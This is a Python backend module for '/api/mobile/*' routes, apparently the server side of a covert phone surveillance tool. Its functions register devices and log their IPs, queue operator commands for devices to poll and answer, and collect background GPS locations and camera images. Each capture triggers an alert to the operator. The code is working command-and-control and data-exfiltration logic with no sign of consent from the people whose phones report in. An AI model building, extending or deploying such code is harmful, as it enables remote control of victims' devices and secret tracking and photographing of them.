"""Mobile service (P4.3) — business logic behind ``/api/mobile/*`` routes.

Extracted verbatim from ``app/blueprints/capture_mobile.py`` route
bodies (originally moved verbatim from ``app.py`` at P3.4).  The
blueprint stays a thin HTTP adapter; session/queue bookkeeping (shared
``app.state.STORE``), persistence (frozen ``database.py``) and
notification fan-out live here.

No behavior change intended — ``tests/char`` freezes response shapes.
"""
from __future__ import annotations

import base64
import os
from datetime import datetime

import database as db

from app.state import BASE_DIR, STORE, send_notification


def register_client(uid: str, info: dict, ip: str) -> None:
    """Register device: persistent row + in-memory session + notification."""
    # Save to DATABASE (PERSISTENT - survives restart!)
    db.save_mobile_session(uid, info, ip)

    # Also keep in memory for current session
    STORE.mobile_session_set(uid, info, ip, datetime.now().isoformat())

    # Send notification
    send_notification({
        "type": "Mobile Device Connected",
        "uid": uid,
        "platform": info.get('platform', 'Unknown'),
        "userAgent": info.get('userAgent', 'Unknown'),
        "timestamp": datetime.now().isoformat()
    })


def poll(uid: str):
    """Device poll: touch last_seen (db + memory), dequeue one command."""
    # Update last seen in DATABASE
    db.update_mobile_last_seen(uid)

    STORE.mobile_last_seen_update(uid)  # no-op when uid unknown (legacy)

    # Check for commands
    return STORE.mobile_command_dequeue(uid)


def post_response(uid: str, output) -> None:
    """Device sent a command response."""
    STORE.mobile_response_append(uid, output, datetime.now().isoformat())


def send_command(uid: str, command) -> None:
    """Operator queued a command for the device."""
    STORE.mobile_command_enqueue(uid, command)


def pop_response(uid: str):
    """Admin fetch: pop the OLDEST buffered response (or ``None``)."""
    return STORE.mobile_response_pop(uid)


def add_tracking(uid: str, tracking_data: dict) -> None:
    """Store one background-tracking sample (+ notify on location events)."""
    # P16 fix: the mobile client may post ``data`` as a bare string/base64
    # blob, but this function did ``tracking_data['received_at'] = ...`` and
    # blew up with TypeError on a str -> 500.
    if not isinstance(tracking_data, dict):
        tracking_data = {'data': tracking_data}
    # Store tracking data with timestamp
    # (per-uid list, trim-at-100, lives in the StateStore since P5.3)
    tracking_data['received_at'] = datetime.now().isoformat()
    STORE.mobile_tracking_append(uid, tracking_data)

    # Send notification for important events
    if tracking_data.get('type') == 'background_location':
        send_notification({
            "type": "Mobile Location Update",
            "uid": uid,
            "latitude": tracking_data.get('latitude'),
            "longitude": tracking_data.get('longitude'),
            "timestamp": tracking_data.get('timestamp')
        })


def get_tracking(uid: str) -> list:
    """Admin fetch: every stored tracking sample for ``uid``."""
    return STORE.mobile_tracking_all(uid)


def save_camera_capture(uid: str, image_data: str) -> str:
    """Decode + persist a camera capture.  Returns the stored filename."""
    # Clean up headers if present
    if ',' in image_data:
        image_data = image_data.split(',')[1]

    decoded_data = base64.b64decode(image_data)
    fname = 'mobile_' + datetime.utcnow().strftime('%d%Y%H%M%S') + '.jpg'
    images_dir = os.path.join(BASE_DIR, 'images')
    os.makedirs(images_dir, exist_ok=True)
    imgpath = os.path.join(images_dir, fname)

    with open(imgpath, 'wb') as f:
        f.write(decoded_data)

    # Store reference
    STORE.mobile_capture_set(uid, 'camera', fname,
                             '/images/' + fname,
                             {'size': len(decoded_data)})

    # Index in the capture gallery (persistent across restarts)
    db.save_mobile_capture(uid, 'camera', fname, '/images/' + fname, {
        'size': len(decoded_data)
    })

    # Send notification
    send_notification({
        "type": "Mobile Camera Capture",
        "uid": uid,
        "filename": fname,
        "timestamp": datetime.now().isoformat()
    })

    return fname


def list_clients() -> list:
    """Admin listing: DB is source of truth, memory merged in, 24h window."""
    # Load ALL sessions from database (PERSISTENT)
    all_sessions = db.get_all_mobile_sessions()

    # Merge with in-memory sessions
    # (merge runs through the StateStore; never overwrites live entries)
    STORE.mobile_sessions_import(all_sessions)

    clients = []
    now = datetime.now()
    for uid, session in STORE.mobile_all_sessions().items():
        if not uid:
            # Skip corrupt sessions that have no uid
            continue
        try:
            last_seen = datetime.fromisoformat(session['last_seen'])
            seconds_ago = (now - last_seen).total_seconds()

            # Show all sessions from last 24 hours (not just 60 seconds)
            if seconds_ago < 86400:  # 24 hours
                clients.append({
                    'uid': uid,
                    'info': session['info'],
                    'ip': session['ip'],
                    'last_seen': session['last_seen'],
                    'seconds_ago': int(seconds_ago),
                    'status': 'online' if seconds_ago < 60 else 'offline'
                })
        except:
            pass
    return clients


__all__ = [
    "register_client", "poll", "post_response", "send_command",
    "pop_response", "add_tracking", "get_tracking",
    "save_camera_capture", "list_clients",
]
